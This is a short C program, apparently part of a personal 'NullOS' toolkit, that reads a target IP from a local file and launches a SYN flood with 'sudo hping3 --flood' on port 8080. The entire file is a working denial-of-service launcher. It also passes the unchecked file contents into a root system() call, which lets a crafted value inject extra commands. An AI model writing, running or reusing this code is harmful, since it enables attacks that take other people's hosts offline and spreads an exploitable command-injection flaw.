#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char ip[150];
    char command[1000];
    char filepath[512];


    char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "Error: HOME not set\n");
        return 1;
    }


    snprintf(filepath, sizeof(filepath), "%s/Documents/NullOS/Null/c/ip.txt", home);


    FILE *f = fopen(filepath, "r");
    if (!f) {
        perror("fopen");
        return 1;
    }
    if (fgets(ip, sizeof(ip), f) == NULL) {
        fprintf(stderr, "Error: Could not read IP from file\n");
        fclose(f);
        return 1;
    }
    fclose(f);


    char *newline = strchr(ip, '\n');
    if (newline) *newline = '\0';


    snprintf(command, sizeof(command), "sudo hping3 -S -p 8080 --flood %s", ip);

    printf("Running: %s\n", command);

    system(command);

    return 0;
}
